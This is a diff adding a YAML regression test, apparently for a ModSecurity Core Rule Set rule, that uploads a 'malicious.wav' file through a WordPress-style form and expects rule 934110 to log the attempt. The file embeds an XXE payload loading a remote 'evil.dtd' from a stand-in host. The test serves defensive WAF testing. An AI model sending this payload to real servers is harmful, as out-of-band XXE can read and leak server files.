@@ -1,0 +1,42 @@
+---
+  meta:
+    author: "Andrea Menin (theMiddle)"
+    description: "XML eXternal Entity"
+    enabled: true
+    name: 934110.yaml
+  tests:
+  -
+    test_title: 934110-1
+    desc: "Test XXE in file upload"
+    stages:
+    - stage:
+        input:
+          dest_addr: "127.0.0.1"
+          headers:
+            Host: "localhost"
+            User-Agent: "ModSecurity CRS 3 Tests"
+            Content-Type: "multipart/form-data; boundary=------WebKitFormBoundarysbZ9sZS2ONRQAD7q"
+          port: 80
+          method: POST
+          data: |
+            --------WebKitFormBoundarysbZ9sZS2ONRQAD7q
+            Content-Disposition: form-data; name="name"
+
+            malicious.wav"
+            --------WebKitFormBoundarysbZ9sZS2ONRQAD7q
+            Content-Disposition: form-data; name="action"
+
+            upload-attachment
+            --------WebKitFormBoundarysbZ9sZS2ONRQAD7q
+            Content-Disposition: form-data; name="_wpnonce"
+
+            0034421736
+            --------WebKitFormBoundarysbZ9sZS2ONRQAD7q
+            Content-Disposition: form-data; name="async-upload"; filename="malicious.wav"
+            Content-Type: audio/wav
+
+            RIFFXWAVEiXML{<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM 'http://example.com/evil.dtd'>%remote;%init;%trick;]>fmtXXXXXdataXXXXXX
+            --------WebKitFormBoundarysbZ9sZS2ONRQAD7q--
+          uri: "/"
+        output:
+          log_contains: id "934110"
